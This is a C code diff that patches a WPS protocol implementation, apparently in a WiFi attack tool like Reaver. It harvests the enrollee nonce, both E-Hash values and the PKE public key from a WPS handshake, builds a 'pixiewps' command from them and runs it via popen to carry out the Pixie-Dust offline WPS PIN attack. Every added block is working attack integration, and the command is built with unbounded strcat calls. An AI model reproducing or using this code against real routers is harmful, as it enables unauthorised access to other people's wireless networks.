@@ -11,6 +11,8 @@
  *
  * See README and COPYING for more details.
  */
+#include "globule.h"
+#include "t6.h"
 
 #include "utils/includes.h"
 
@@ -1695,6 +1697,36 @@ static int wps_process_enrollee_nonce(struct wps_data *wps, const u8 *e_nonce)
 	wpa_hexdump(MSG_DEBUG, "WPS: Enrollee Nonce",
 		    wps->nonce_e, WPS_NONCE_LEN);
 
+    /****** ADD THIS PART ******/
+    memset(cmd_pixie,0,sizeof(cmd_pixie));
+    memset(cmd_pixie_aux,0,sizeof(cmd_pixie_aux));
+    strcat(cmd_pixie,"pixiewps ");
+   
+    if(globule->op_pixie==2)
+    {
+      strcat(cmd_pixie," -n "); 
+    }
+    printf("[P] E-Nonce: ");
+    int pixiecnt = 0;
+    for (; pixiecnt < WPS_NONCE_LEN; pixiecnt++) {
+        printf("%02x", wps->nonce_e[pixiecnt]);
+        if(globule->op_pixie==2)
+        {
+	  sprintf(cmd_pixie_aux, "%02x",  wps->nonce_e[pixiecnt]);
+	  strcat(cmd_pixie,cmd_pixie_aux);
+	}
+        if (pixiecnt != WPS_NONCE_LEN - 1) {
+            printf(":");
+            if(globule->op_pixie==2)
+	    {
+		 strcat(cmd_pixie,":");
+	    }
+        }
+    }
+    printf("\n");
+    /******/
+
+
 	return 0;
 }
 
@@ -1753,6 +1785,23 @@ static int wps_process_e_hash1(struct wps_data *wps, const u8 *e_hash1)
 	os_memcpy(wps->peer_hash1, e_hash1, WPS_HASH_LEN);
 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash1", wps->peer_hash1, WPS_HASH_LEN);
 
+    /****** ADD THIS PART ******/
+    strcat(cmd_pixie," -s ");
+    printf("[P] E-Hash1: ");
+    int pixiecnt = 0;
+    for (; pixiecnt < WPS_HASH_LEN; pixiecnt++) {
+        printf("%02x", wps->peer_hash1[pixiecnt]);
+        sprintf(cmd_pixie_aux, "%02x", wps->peer_hash1[pixiecnt]);
+        strcat(cmd_pixie,cmd_pixie_aux);
+        if (pixiecnt != WPS_HASH_LEN - 1) {
+            printf(":");
+            strcat(cmd_pixie,":");
+        }
+    }
+    printf("\n");
+    /******/
+
+
 	return 0;
 }
 
@@ -1766,6 +1815,54 @@ static int wps_process_e_hash2(struct wps_data *wps, const u8 *e_hash2)
 
 	os_memcpy(wps->peer_hash2, e_hash2, WPS_HASH_LEN);
 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash2", wps->peer_hash2, WPS_HASH_LEN);
+
+    /****** ADD THIS PART ******/
+    strcat(cmd_pixie," -z ");
+    printf("[P] E-Hash2: ");
+    int pixiecnt = 0;
+    for (; pixiecnt < WPS_HASH_LEN; pixiecnt++) {
+        printf("%02x", wps->peer_hash2[pixiecnt]);
+        sprintf(cmd_pixie_aux, "%02x",  wps->peer_hash2[pixiecnt]);
+        strcat(cmd_pixie,cmd_pixie_aux);
+        if (pixiecnt != WPS_HASH_LEN - 1) {
+            printf(":");
+            strcat(cmd_pixie,":");
+        }
+    }
+    printf("\n");
+    /******/
+
+    if(globule->op_pixie==1 || globule->op_pixie==2){
+        strcat(cmd_pixie," -S ");
+    }
+    //sprintf(cmd_pixie,"%s -S",cmd_pixie);
+	
+
+    if(globule->op_pixie==1 || globule->op_pixie==2 || globule->op_pixie==3)
+    {
+        
+        FILE *fpixe;
+
+        if ((fpixe = popen(cmd_pixie, "r")) == NULL) {
+            printf("Error opening pipe!\n");
+            //return -1;
+        }
+
+        while (fgets(pixie_buf_aux, 4000, fpixe) != NULL) {
+            
+            printf("[Pixie-Dust]  %s", pixie_buf_aux);
+            
+        }
+
+        if(pclose(fpixe))  {
+            //printf("Command not found or exited with error status\n");
+            //return -1;
+        }
+
+    }
+
+    //printf(" %s ",cmd_pixie);
+   
 
 	return 0;
 }
@@ -1898,6 +1995,25 @@ static int wps_process_pubkey(struct wps_data *wps, const u8 *pk,
 	wps->dh_pubkey_e = wpabuf_alloc_copy(pk, pk_len);
 	if (wps->dh_pubkey_e == NULL)
 		return -1;
+
+    /****** ADD THIS PART ******/
+   // memset (cmd_pixie,0,sizeof(cmd_pixie));
+    strcat(cmd_pixie," -e ");
+    //sprintf( cmd_pixie, "", cmd_pixie, str2);
+
+    printf("[P] PKE: ");
+    int pixiecnt = 0;
+    for (; pixiecnt < 192; pixiecnt++) {
+        printf("%02x", pk[pixiecnt]);
+        sprintf(cmd_pixie_aux, "%02x", pk[pixiecnt]);
+	strcat(cmd_pixie,cmd_pixie_aux);
+        if (pixiecnt != 191) {
+            printf(":");
+            strcat(cmd_pixie,":");
+        }
+    }
+    printf("\n");
+    /******/
 
 	return 0;
 }
